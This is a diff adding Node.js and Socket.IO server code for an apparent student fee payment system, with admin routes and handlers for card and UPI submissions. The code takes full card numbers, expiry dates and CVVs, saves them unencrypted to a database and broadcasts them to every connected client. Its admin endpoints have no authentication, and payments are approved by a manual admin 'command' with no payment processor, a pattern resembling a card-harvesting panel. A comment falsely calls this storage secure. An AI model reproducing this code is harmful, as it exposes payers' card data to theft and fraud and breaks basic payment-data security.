@@ -1,0 +1,318 @@
+// ADD THESE NEW API ROUTES AFTER LINE 540 (after app.get('/api/transactions'))
+
+// ============================================
+// NEW API ENDPOINTS FOR PERSISTENT SUBMISSIONS
+// ============================================
+
+// Get all card submissions
+app.get('/api/admin/submissions', async (req, res) => {
+    try {
+        const submissions = await database.getAllCardSubmissions(1000);
+        res.json({
+            success: true,
+            total: submissions.length,
+            submissions: submissions
+        });
+        logger.info('All submissions loaded', { count: submissions.length });
+    } catch (error) {
+        logger.error('Error loading submissions:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to load submissions'
+        });
+    }
+});
+
+// Mark submission as seen
+app.post('/api/admin/submissions/:sessionId/seen', async (req, res) => {
+    try {
+        const { sessionId } = req.params;
+        await database.markSubmissionAsSeen(sessionId);
+        
+        // Broadcast to all admins
+        io.emit('submissionMarkedSeen', { sessionId });
+        
+        res.json({
+            success: true,
+            message: 'Submission marked as seen'
+        });
+        logger.info('Submission marked as seen', { sessionId });
+    } catch (error) {
+        logger.error('Error marking submission as seen:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to mark submission as seen'
+        });
+    }
+});
+
+// Hide commands for submission
+app.post('/api/admin/submissions/:sessionId/hide-commands', async (req, res) => {
+    try {
+        const { sessionId } = req.params;
+        await database.hideSubmissionCommands(sessionId);
+        
+        // Broadcast to all admins
+        io.emit('submissionCommandsHidden', { sessionId });
+        
+        res.json({
+            success: true,
+            message: 'Commands hidden for submission'
+        });
+        logger.info('Commands hidden for submission', { sessionId });
+    } catch (error) {
+        logger.error('Error hiding commands:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to hide commands'
+        });
+    }
+});
+
+// ============================================
+// MODIFY WEBSOCKET CONNECTION HANDLER
+// Add these socket event handlers inside io.on('connection', (socket) => {...})
+// After line 260 (after socket.on('adminCommand'))
+// ============================================
+
+    // NEW: Mark submission as seen
+    socket.on('markSubmissionSeen', async (data) => {
+        try {
+            await database.markSubmissionAsSeen(data.sessionId);
+            io.emit('submissionMarkedSeen', { sessionId: data.sessionId });
+        } catch (error) {
+            logger.error('Error marking submission as seen:', error);
+        }
+    });
+    
+    // NEW: Hide submission commands
+    socket.on('hideSubmissionCommands', async (data) => {
+        try {
+            await database.hideSubmissionCommands(data.sessionId);
+            io.emit('submissionCommandsHidden', { sessionId: data.sessionId });
+        } catch (error) {
+            logger.error('Error hiding commands:', error);
+        }
+    });
+
+// ============================================
+// MODIFY handleCardDetailsSubmission FUNCTION
+// Replace the entire function starting at line 316
+// ============================================
+
+async function handleCardDetailsSubmission(socket, data) {
+    console.log('📥 handleCardDetailsSubmission called with:', {
+        sessionId: data.sessionId,
+        hasCardDetails: !!data.cardDetails
+    });
+    
+    const { sessionId, cardDetails } = data;
+    
+    // Validate input
+    if (!sessionId) {
+        console.error('❌ No sessionId provided');
+        socket.emit('error', { message: 'Session ID is required' });
+        return;
+    }
+    
+    if (!cardDetails) {
+        console.error('❌ No cardDetails provided');
+        socket.emit('error', { message: 'Card details are required' });
+        return;
+    }
+    
+    // Get session
+    const session = systemData.paymentSessions.get(sessionId);
+    
+    if (!session) {
+        console.error('❌ Session not found:', sessionId);
+        console.log('📋 Available sessions:', Array.from(systemData.paymentSessions.keys()));
+        socket.emit('error', { message: 'Payment session not found' });
+        return;
+    }
+    
+    console.log('✅ Session found:', {
+        sessionId,
+        hasStudent: !!session.student,
+        studentName: session.student?.name
+    });
+    
+    // Store card details securely
+    session.cardDetails = {
+        cardNumber: cardDetails.cardNumber,
+        cardType: cardDetails.cardType,
+        expiryDate: cardDetails.expiryDate,
+        cvv: cardDetails.cvv,
+        cardHolderName: cardDetails.cardHolderName
+    };
+    session.paymentMethod = 'Card';
+    session.status = 'processing';
+    
+    console.log('💾 Card details stored in session');
+    
+    // Prepare submission data
+    const submissionData = {
+        sessionId,
+        type: 'card',
+        student: session.student,
+        cardDetails: session.cardDetails,
+        amount: session.amount,
+        status: 'processing',
+        timestamp: new Date().toISOString()
+    };
+    
+    // PERSIST TO DATABASE
+    try {
+        await database.createCardSubmission(submissionData);
+        console.log('✅ Card submission persisted to database');
+    } catch (error) {
+        logger.error('Error persisting card submission:', error);
+    }
+    
+    // Broadcast to all admins via WebSocket
+    io.emit('cardDetailsReceived', submissionData);
+    console.log('📡 Broadcasted cardDetailsReceived via WebSocket');
+    
+    // Send confirmation back to student
+    socket.emit('cardDetailsAcknowledged', {
+        sessionId,
+        message: 'Card details received, waiting for admin approval'
+    });
+    
+    logEvent(`Card details received for session: ${sessionId}`, 'info');
+    console.log('✅ Card details processing complete');
+}
+
+// ============================================
+// MODIFY handleUpiDetailsSubmission FUNCTION
+// Replace the entire function starting at line 396
+// ============================================
+
+async function handleUpiDetailsSubmission(socket, data) {
+    const { sessionId, upiDetails } = data;
+    
+    const session = systemData.paymentSessions.get(sessionId);
+    if (!session) {
+        socket.emit('error', { message: 'Payment session not found' });
+        return;
+    }
+    
+    session.upiDetails = {
+        upiId: upiDetails.upiId,
+        upiApp: upiDetails.upiApp
+    };
+    session.paymentMethod = 'UPI';
+    session.status = 'processing';
+    
+    const submissionData = {
+        sessionId,
+        type: 'upi',
+        student: session.student,
+        upiDetails: session.upiDetails,
+        amount: session.amount,
+        status: 'processing',
+        timestamp: new Date().toISOString()
+    };
+    
+    // PERSIST TO DATABASE
+    try {
+        await database.createCardSubmission(submissionData);
+        console.log('✅ UPI submission persisted to database');
+    } catch (error) {
+        logger.error('Error persisting UPI submission:', error);
+    }
+    
+    io.emit('upiDetailsReceived', submissionData);
+    logEvent(`UPI details received for session: ${sessionId}`, 'info');
+}
+
+// ============================================
+// MODIFY handleAdminCommand FUNCTION
+// Replace starting at line 422
+// ============================================
+
+async function handleAdminCommand(socket, data) {
+    const { command, sessionId, action } = data;
+    
+    logEvent(`Admin command: ${command} for session: ${sessionId}`, 'info');
+    
+    if (command === 'approvePayment') {
+        await approvePayment(sessionId);
+    } else if (command === 'rejectPayment') {
+        await rejectPayment(sessionId, data.reason);
+    }
+}
+
+async function approvePayment(sessionId) {
+    const session = systemData.paymentSessions.get(sessionId);
+    if (!session) return;
+    
+    session.status = 'completed';
+    
+    // Update submission status in database
+    try {
+        await database.updateSubmissionStatus(sessionId, 'completed');
+    } catch (error) {
+        logger.error('Error updating submission status:', error);
+    }
+    
+    const transaction = {
+        id: generateTransactionId(),
+        sessionId,
+        rollNumber: session.student.rollNumber,
+        studentName: session.student.name,
+        amount: session.amount,
+        paymentMethod: session.paymentMethod,
+        cardType: session.cardDetails?.cardType,
+        status: 'completed',
+        timestamp: new Date().toISOString()
+    };
+    
+    // Notify student
+    const studentSocket = Array.from(systemData.wsClients).find(s => s.id === session.socketId);
+    if (studentSocket) {
+        studentSocket.emit('paymentApproved', {
+            transaction,
+            message: 'Payment approved successfully'
+        });
+    }
+    
+    // Broadcast to all admins
+    io.emit('paymentCompleted', { sessionId, transaction });
+    
+    logEvent(`Payment approved: ${transaction.id}`, 'success');
+}
+
+async function rejectPayment(sessionId, reason) {
+    const session = systemData.paymentSessions.get(sessionId);
+    if (!session) return;
+    
+    session.status = 'failed';
+    session.failureReason = reason;
+    
+    // Update submission status in database
+    try {
+        await database.updateSubmissionStatus(sessionId, 'failed', reason);
+    } catch (error) {
+        logger.error('Error updating submission status:', error);
+    }
+    
+    // Notify student
+    const studentSocket = Array.from(systemData.wsClients).find(s => s.id === session.socketId);
+    if (studentSocket) {
+        studentSocket.emit('paymentRejected', {
+            reason,
+            message: 'Payment was rejected'
+        });
+    }
+    
+    // Broadcast to admins
+    io.emit('paymentFailed', {
+        sessionId,
+        student: session.student,
+        reason,
+        timestamp: new Date().toISOString()
+    });
+    
+    logEvent(`Payment rejected: ${sessionId} - ${reason}`, 'error');
+}
